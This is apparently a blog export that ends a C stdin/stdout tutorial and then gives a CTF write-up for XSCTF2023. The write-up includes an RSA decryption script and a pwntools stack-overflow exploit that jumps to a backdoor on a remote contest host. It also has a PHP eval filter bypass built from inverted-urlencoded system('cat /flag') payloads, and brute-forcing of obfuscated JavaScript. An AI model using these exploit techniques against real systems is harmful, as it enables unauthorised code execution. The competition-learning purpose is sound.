src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018155655371.png" alt="image-20231018155655371" style="zoom:50%;" /><p>3.还有一些表格中可能没有的格式指示符,例如<code>%s</code>,它用于输出一个字符串:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="string">&quot;Hello world!&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="scanf-函数">scanf()函数</h2><h3 id="基本用法">基本用法</h3><p>函数原型为:</p><p><code>int scanf( const char *restrict format, ... );</code></p><p>scanf()函数的功能和printf相反,它用于输入数据(scan意即&quot;扫描&quot;)</p><p>同时,它也接受一个格式字符串和若干准备输入的参数,与printf不同的是,scanf后面的若干参数必须是合法的<code>指针</code>.</p><p>函数的返回值为成功读取的参数个数.</p><p>读者此时不必疑惑<code>指针</code>这个概念,你需要知道相比于printf,scanf后面的参数之前需要加上一个<code>&amp;字符</code>(实际上是取地址运算符),用来获取期待输入值的这个变量的地址(指针).</p><p>实际上很简单,我们想要对一个变量进行输入,就需要知道他的存储位置.</p><p>同时,scanf的格式化字符串不允许使用像printf那样多样的<code>格式指示符</code>,我们仅仅需要使用例如:</p><p>%d来输入int类型的整数;</p><p>%s来输入字符串;</p><p>%f来输入float类型的浮点数;</p><p>%lf来输入double类型的浮点数;</p><p>%ld来输入long类型的整数…</p><p>等等…</p><h3 id="格式指示符">格式指示符</h3><p>C标准中的描述:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018160736236.png" alt="image-20231018160736236"></p><h3 id="举例">举例</h3><p>例如我们需要输入两个int类型的值,赋值给i,j,应该这样写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i,j;</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;i,&amp;j);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, i, j);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018160936632.png" alt="image-20231018160936632" style="zoom: 50%;" /><p>注意到,scanf中的两个<code>%d</code>之间没有空格,我们输入时和printf中却需要空格,这是一个不同,事实上,scanf在输入整数/浮点数时,会不断读取,直到遇到不合法的字符为止—例如空格等空白符,逗号等字符.</p><p>该<code>%d</code>结束后,再继续读取下一个<code>%d</code>.</p><p>另一方面,scanf也允许使用一般字符,scanf会在读取时匹配这些字符(如果格式化字符串中有的话,则必须匹配,否则之后的变量会读取失败),然后简单地丢弃这个字符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>, k=<span class="number">0</span>;</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d%d&quot;</span>, &amp;i, &amp;j, &amp;k);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, i, j, k);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确的输入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018161749017.png" alt="image-20231018161749017" style="zoom:50%;" /><p>错误的输入:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018161814337.png" alt="image-20231018161814337" style="zoom:50%;" /><p>可以看到后两个变量并没有被正确地赋值,或者我们也可以输出scanf的返回值(成功读取的变量个数)来观察:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>, k=<span class="number">0</span>,num=<span class="number">0</span>;</span><br><span class="line">     num = <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d%d&quot;</span>, &amp;i, &amp;j, &amp;k);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%d %d %d\n&quot;</span>, i, j, k);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;num = %d&quot;</span>,num);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231018161942008.png" alt="image-20231018161942008" style="zoom:50%;" /><h3 id="注意">注意</h3><p>1.不要在scanf中使用<code>'\n',' '</code>等空白字符来结尾,例如:</p><p><code>scanf(&quot;%d%d%d &quot;, &amp;i, &amp;j, &amp;k);</code></p><p><code>scanf(&quot;%d%d%d\n&quot;, &amp;i, &amp;j, &amp;k);</code></p><p>因为不同于printf,scanf函数的空白符代表忽略(匹配并丢弃)任意数量的空白字符,如果放在结尾,意味着这个scanf无法使用换行来结束输入!</p><p>2.(个人的建议)scanf中尽量只使用格式指示符,不要使用其他普通字符,做到简化输入.</p><h2 id="getchar-函数">getchar()函数</h2><p>函数原型为:</p><p><code>int getchar( void );</code></p><p>该函数非常简单,用于读取一个字符:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> c = getchar();</span><br></pre></td></tr></table></figure><p>上面的代码和下面的代码等价:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> c</span><br><span class="line"><span class="title function_">scanf</span><span class="params">(<span class="string">&quot;%c&quot;</span>,&amp;c)</span>;</span><br></pre></td></tr></table></figure><h2 id="putchar-函数">putchar()函数</h2><p>函数原型为:</p><p><code>int putchar( int ch );</code></p><p>很简单,<code>putchar('a');</code>就可以将一个字符<code>a</code>输出.</p><h2 id="其他-待扩充">其他(待扩充)</h2><p>puts()和gets()将在讲解字符串时展开.</p><br><p>本章讲解了最常用的几个输入输出函数的使用,到现在我们多少掌握了printf和scanf的写法,需要在练习中不断熟悉.由于比较简单,可能例子不多.</p><p>自己多查资料.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../2023949602bbfb8e/">c语言教程-3_1-数据类型</a></p><p>下一篇:<a href="../20237bb78790d38b/">c语言教程-4-表达式和语句</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-XSCTF2023初赛</title>
      <link href="/2023f369fd533e40/"/>
      <url>/2023f369fd533e40/</url>
      
        <content type="html"><![CDATA[<h1 id="crypto">Crypto</h1><h2 id="题目1-easy-rsa">题目1-easy rsa</h2><p>使用Mathematica数学软件进行方程求解,并筛选出可行解:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/9106898458e3d70d267173fd2756f01f.png" alt="9106898458e3d70d267173fd2756f01f" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p:<span class="number">108021842791966417195317937419622020751339914135950392876631389717196303328745122288829568682158007893687475477612171957153023357929933447215358491430114529821247279180738397413290888437255798414771375647208657248398369739278975678290946624554583579122528493521171797723794930492274778459375087426951672521659</span></span><br><span class="line">q:<span class="number">324491213103511937485837573235633</span></span><br></pre></td></tr></table></figure><p>然后使用RSA解密脚本即可解出明文,然后使用binascii转换为字符串即为flag:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">n = <span class="number">35052138809242039609159777275278725458541473751415176437175001503318881522064795786652691106400353446906298757235241396135707610647382094619828643125184505053687643676993728127835906272771669307861545438892003557176894101050915782630518417655550515213032626941985080617066204665902221073674346788849832690541665755364542885371501944903075147</span></span><br><span class="line">p = <span class="number">108021842791966417195317937419622020751339914135950392876631389717196303328745122288829568682158007893687475477612171957153023357929933447215358491430114529821247279180738397413290888437255798414771375647208657248398369739278975678290946624554583579122528493521171797723794930492274778459375087426951672521659</span></span><br><span class="line">q = <span class="number">324491213103511937485837573235633</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">32126229895829557420173865487224534062896536751420648497526558901007585083150645063005523675709156042236671834263167769107980622024877911701227453158527711350179148603688096479478647852766951147766763992546472396482472628206738548210314398445021525173762355241909294762807202290826656663671253691179492384064106540693719798019256938412073334</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line"><span class="comment"># n = p * q</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 (求逆元)</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)  <span class="comment"># 即m = c^d mod n (求大整数c的d次幂模n取余)</span></span><br><span class="line"><span class="comment"># print(m)  # 求得的明文</span></span><br><span class="line">flag = <span class="built_in">str</span>(<span class="built_in">hex</span>(m))[<span class="number">2</span>:]</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(flag).decode())</span><br></pre></td></tr></table></figure><p><code>XSCTF&#123;Crypto_is_easyyyyyyyyyyyyyyyyyyyyy:D&#125;</code></p><h1 id="pwn">Pwn</h1><h2 id="题目1-babystack">题目1-babystack</h2><p>本题用IDA分析可以看到有一个整数溢出,解决该溢出后会有buf的栈溢出,需要先解决整数溢出:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016142008727.png" alt="image-20231016142008727" style="zoom:50%;" /><p>​<img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016142818260.png" alt="image-20231016142818260" style="zoom:33%;" /></p><p>scanf中使用%4d来输入,意味着我们可以输入负数,这样对v4进行uint16_t的解释时就会出现回绕(带模加法形成一个阿贝尔群?—&gt;见csapp)</p><p>uint16_t向uint32_t进行隐式转换(其实不重要?),2147483646转32位二进制为</p><p>​<code>01111111 11111111 11111111 11111110</code></p><p>想办法使用负数回绕即可(带模加法形成一个阿贝尔群?—&gt;见csapp),我这里学的不是很扎实,我选择写程序:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int16_t</span> a=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">uint32_t</span> b=a;</span><br><span class="line">        <span class="keyword">if</span>(b&gt;<span class="number">2147483646</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d   %d    %hu   %#x\n&quot;</span>,a,b,a,b);</span><br><span class="line">        <span class="keyword">if</span>(++a==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实际上就是scanf输入后,无论怎么解释,二进制位不变,C语言中进行uint16_t向uint32_t转换时,貌似会将最高位的符号位进行扩展?(linux的x64),总之写代码就可以找出一系列数:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016143653985.png" alt="image-20231016143653985" style="zoom:50%;" /><p>继续查找函数发现有backdoor()函数可以直接getshell:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016143806992.png" alt="image-20231016143806992" style="zoom:50%;" /><p>直接编写exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;43.248.97.200&#x27;</span>, <span class="number">40054</span>)</span><br><span class="line"><span class="meta"># p = process(<span class="string">&#x27;./babystack&#x27;</span>)</span></span><br><span class="line"><span class="meta"># p=gdb.debug(<span class="string">&#x27;./babystack&#x27;</span>,<span class="string">&#x27;break main&#x27;</span>)</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000004013d3</span></span><br><span class="line">sys = <span class="number">0x4010C0</span></span><br><span class="line">binsh = <span class="number">0x40209F</span></span><br><span class="line"><span class="meta"># backdoor = 0x4012B7</span></span><br><span class="line">backdoor = <span class="number">0x4012BC</span></span><br><span class="line"># 并不是首地址,跳过了push ebp来栈平衡</span><br><span class="line"><span class="meta"># https:<span class="comment">//zhuanlan.zhihu.com/p/415492654</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#payload = b<span class="string">&#x27;a&#x27;</span> * 0x58 + p64(pop_rdi_ret) + p64(binsh) +p64(1)+ p64(sys)</span></span><br><span class="line">payload = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">0x59</span> + p64(backdoor)</span><br><span class="line"># 多输入一个字节才行,原因未知,fastcall的backdoor函数没道理啊?</span><br><span class="line">num = <span class="string">&#x27;-156&#x27;</span></span><br><span class="line">p.send(num)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时遇到了栈平衡的问题,也是这题学到的知识点,终于多少弄明白了.</p><p>还有一个问题就是,不知为何溢出覆盖时少了一个字节,最后多加了一个字节才成功.</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016144119757.png" alt="image-20231016144119757" style="zoom:50%;" /><p><code>XSCTF&#123;E49AA5B5-B7DA-769B-4AE7-F40A17E09A04&#125;</code></p><h1 id="web">Web</h1><h2 id="题目1-eval-eval-我的">题目1-eval_eval_我的</h2><p>打开一看就是eval命令执行,同时有正则检查:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016144446446.png" alt="image-20231016144446446" style="zoom:50%;" /><p>先看后两个,是md5强碰撞绕过,直接传入两个数组即可—如果是数组,那么md5()不仅不会报错,还会返回null,这就绕过了md5().</p><p>再看正则,我们预想的是使用system()函数去执行linux命令,但是有正则过滤,这里使用urlencode+取反进行绕过:</p><p>这里的函数执行格式为(func)();</p><p>所以我们使用php函数分别对函数和参数进行url编码取反</p><p>使用在线php网站:</p><p><a href="https://www.bejson.com/runcode/php/">https://www.bejson.com/runcode/php/</a></p><p>依次运行两行命令:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//echo urlencode(~&#x27;system&#x27;);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;cat /flag&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分别获得结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8B</span>%<span class="number">9</span>A%<span class="number">92</span></span><br><span class="line">和</span><br><span class="line">%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8B</span>%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span></span><br></pre></td></tr></table></figure><p>这样payload就分析好了:</p><p>get方法为<code>?xsctf=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p><p>post方法为<code>Xp0int[]=1&amp;Sloth[]=2</code></p><p>使用谷歌浏览器的hackbar插件:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016145100970.png" alt="image-20231016145100970" style="zoom:50%;" /><p>结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016145119519.png" alt="image-20231016145119519" style="zoom:50%;" /><p><code>XSCTF&#123;YoU_F1NalLy_EvaLLL_m3!!&#125;</code></p><h1 id="reverse">Reverse</h1><h2 id="题目1-jsnewnew">题目1-JSNEWNEW</h2><p>这个题我最后也没分析出来_H4H4H4和_H4H4H4H4两个函数的原理…</p><p><s>但是我会暴力</s></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016145413986.png" alt="image-20231016145413986" style="zoom:50%;" /><p>我们可以进行如下测试:</p><p>首先对_H4H4H4()进行分析:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_Y0u</span>(<span class="params">_0x5093c8, _0x291ad5</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x5093c8 + _0x291ad5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_C4n</span>(<span class="params">_0x4277b8</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x4277b8 &amp; <span class="number">0xff</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_N3v3r</span>(<span class="params">_0x414184, _0x29df09</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(_0x414184 ^ _0x29df09)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_G37</span>(<span class="params">_0x500f65, _0x1ddb85</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(_0x500f65 | _0x1ddb85)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_Th15</span>(<span class="params">_0x1621d6, _0x285fc7</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(_0x1621d6 &amp; _0x285fc7)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4</span>(<span class="params">_0x2abb65</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(~_0x2abb65)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4H4</span>(<span class="params">_0x5b22bc</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>(<span class="title function_">_H4H4H4</span>(<span class="title function_">_H4</span>(_0x5b22bc), <span class="title function_">_H4H4H4</span>([], <span class="number">0x1</span>)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4H4H4</span>(<span class="params">_0x431cb1, _0x516603</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">_C4n</span>((<span class="title function_">_H4</span>(<span class="title function_">_G37</span>(<span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603)), <span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603)))), <span class="title function_">_H4</span>(<span class="title function_">_G37</span>(<span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603)), <span class="title function_">_H4</span>(<span class="title function_">_Y0u</span>(_0x431cb1, _0x516603))))))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_H4H4H4H4</span>(<span class="params">_0x1b81b8, _0x11e8ab, _0x2c730f</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a = <span class="title function_">_H4H4H4</span>(_0x1b81b8, _0x2c730f), a = <span class="title function_">_H4H4H4</span>(a, <span class="title function_">_H4H4</span>(_0x11e8ab)), a = <span class="title function_">_H4H4H4</span>(a, <span class="title function_">_H4H4</span>(_0x2c730f)), <span class="title function_">_C4n</span>(a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;_H4H4H4&quot;</span>)</span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 2</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 1</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 1</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">3</span>, <span class="number">3</span>) <span class="comment">// 011 011</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 6</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">3</span>, <span class="number">0</span>) <span class="comment">// 011 000</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 3</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">0</span>, <span class="number">3</span>) <span class="comment">// 000 011</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 3</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">3</span>, <span class="number">2</span>) <span class="comment">// 011 010</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 5</span></span><br><span class="line"></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">18</span>, <span class="number">3</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 21</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">21</span>, <span class="number">56</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 77</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">6</span>, <span class="number">7</span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 13</span></span><br><span class="line">num = <span class="title function_">_H4H4H4</span>(<span class="number">19</span>, <span class="number">2</span>) <span class="comment">// 011 010</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num) <span class="comment">// 21</span></span><br></pre></td></tr></table></figure><p><code>根据结果进行推测,发现实际上_H4H4H4(a,b)就是(a+b)</code></p><p>再看_H4H4H4H4(a,b,c),这里发现c是一个随机数,我们尝试先固定c,对a,b进行爆破:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="built_in">log</span>(<span class="string">&quot;_H4H4H4H4&quot;</span>)</span><br><span class="line">rand_num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(var a=<span class="number">0</span>;a&lt;<span class="number">128</span>;a+=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(var b=<span class="number">0</span>;b&lt;<span class="number">128</span>;b+=<span class="number">1</span>)&#123;</span><br><span class="line">        console.<span class="built_in">log</span>(_H4H4H4H4(a, b, rand_num))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231016150055629.png" alt="image-20231016150055629" style="zoom:50%;" /><p>其实多此一举,明文不同,从加密的角度,结果当然不同,我们尝试a,b固定(或者变化范围很小),对c爆破:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="built_in">log</span>(<span class="string">&quot;_H4H4H4H4&quot;</span>)</span><br><span class="line">globala = <span class="number">12</span></span><br><span class="line">globalb = <span class="number">45</span></span><br><span class="line"><span class="keyword">for</span>(var c=<span class="number">0</span>;c&lt;=<span class="number">100</span>;c+=<span class="number">1</span>)&#123;</span><br><span class="line">    console.<span class="built_in">log</span>(_H4H4H4H4(globala, globalb, c))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img 